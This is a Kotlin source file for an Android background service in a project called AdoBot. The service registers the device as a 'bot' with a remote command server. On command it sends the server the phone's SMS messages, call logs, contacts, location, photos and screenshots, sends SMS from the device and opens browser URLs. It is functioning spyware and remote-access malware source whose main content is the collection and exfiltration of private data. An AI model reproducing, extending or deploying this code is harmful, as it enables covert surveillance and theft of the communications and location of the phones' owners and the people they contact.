package me.adobot

import android.app.Service
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.IBinder
import android.support.v4.app.ActivityCompat
import android.support.v4.content.ContextCompat
import android.util.Base64
import android.util.Log
import io.socket.client.IO
import io.socket.client.Socket
import me.adobot.tasks.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.FileInputStream
import android.content.Context
import android.location.Location
import android.location.LocationManager
import android.net.Uri
import me.adobot.activities.WebRTC


class CommandService : Service() {


    private val tag = "Suthar"
    private var connected = false
    private var socket: Socket? = null

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()

        createSocket(Constants.DEVELOPMENT_SERVER)
        //cleanUp()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        Log.i(tag, "Running onStartCommand")
        Log.i(tag, "\n\n\nSocket is " + if (connected) "connected" else "not connected\n\n\n")

        if (!connected) {
            Log.i(tag, "Socket is connecting ......\n")
            socket?.connect()
        }
        return Service.START_STICKY
    }

    private fun createSocket(server: String) {

        val socket = IO.socket(server); this.socket = socket

        socket.on(Socket.EVENT_CONNECT) {

            connected = true
            Log.i(tag, "\n\nSocket connected\n\n")

            val params = CommonParams(this)

            val bot = JSONObject()
            bot.put("uid", params.uid)
            bot.put("provider", params.provider)
            bot.put("device", params.device)
            bot.put("sdk", params.sdk)
            bot.put("version", params.version)
            bot.put("phone", params.phone)
            bot.put("location", getLastLocation())

            socket.emit("registerBot", bot)
        }


        socket.on("commands") { args ->

            val cmds = args[0] as JSONArray

            for (i in 0..(cmds.length() - 1)) {
                val cmd = cmds.getJSONObject(i)

                val command = cmd.get("command") as String
                Log.i(tag, "\nCommand: " + cmd.toString() + "\n")


                when (command) {
                    "getSms" -> {
                        val arg1 = Integer.parseInt(cmd.get("arg1").toString())
                        GetSmsTask(this, arg1, socket).start()

                    }
                    "getCallHistory" -> {
                        val arg1 = Integer.parseInt(cmd.get("arg1").toString())
                        GetCallLogsTask(this, arg1, socket).start()

                    }
                    "getContacts" -> {
                        GetContactsTask(this, socket).start()
                    }
                    "getLocation" -> {
                        LocationMonitor(this, socket).start()
                    }
                    "sendSms" -> {
                        val phoneNumber = cmd.get("arg1").toString()
                        val textMessage = cmd.get("arg2").toString()
                        SendSmsTask(this, textMessage, phoneNumber, socket).start()
                    }
                    "getImages" -> {
                        GetPhotos(this, socket).start()
                    }
                    "downloadImage" -> {
                        val path = cmd.get("arg1").toString()
                        downloadImage(path, socket)
                    }
                    "openBrowser" -> {

                        val url = cmd.get("arg1").toString()

                        val intent = Intent(Intent.ACTION_VIEW)
                        intent.data = Uri.parse("http://$url")
                        intent.`package` = "com.android.chrome"  // package of ChromeBrowser App
                        startActivity(intent)
                    }
                    "stopAll" -> {
                        GetPhotos.flag = false
                    }
                    "takeScreenShot" ->{
                        val intent = Intent(this, WebRTC::class.java)
                        startActivity(intent)
                    }
                    else -> {
                        Log.i(tag, "Unknown command")
                        /*val xcmd: HashMap<String, String> = HashMap()
                        xcmd.put("event", "command:unknown")
                        xcmd.put("uid", params.uid)
                        xcmd.put("device", params.device)
                        xcmd.put("command", command)*/
                    }
                }
            }
        }

        socket.on(Socket.EVENT_DISCONNECT) {
            connected = false
            Log.i(tag, "\n\nSocket disconnected...\n\n")

            GetPhotos.flag = false
        }

        socket.on(Socket.EVENT_RECONNECTING) { Log.i(tag, "Socket reconnecting...") }
    }

    private fun downloadImage(path: String, socket: Socket) {
        val data = JSONObject()
        data.put("name", File(path).name)
        data.put("image64", encodeImage(path))
        data.put("dataType", "downloadImage")

        socket.emit("usrData", data)
    }

    private fun encodeImage(path: String): String {

        val imageFile = File(path)
        val fis = FileInputStream(imageFile)

        val bm = BitmapFactory.decodeStream(fis)
        val baos = ByteArrayOutputStream()
        bm.compress(Bitmap.CompressFormat.JPEG, 100, baos)
        val b = baos.toByteArray()
        return Base64.encodeToString(b, Base64.DEFAULT)
    }

    private fun getLastLocation(): JSONObject? {
        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
                ActivityCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {


            val  locationManager = this.getSystemService(Context.LOCATION_SERVICE) as LocationManager
            val lastLocation = locationManager.getLastKnownLocation(LocationManager.PASSIVE_PROVIDER) as Location

            val location = JSONObject()
            location.put("lat", lastLocation.latitude)
            location.put("lon", lastLocation.longitude)
            return location
        }
        return null
    }

    /*private fun cleanUp() {
        //remove previously installed update apk file
        val updateApk = File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS), Constants.UPDATE_PKG_FILE_NAME)
        if (updateApk.exists())
            updateApk.delete()
    }*/
}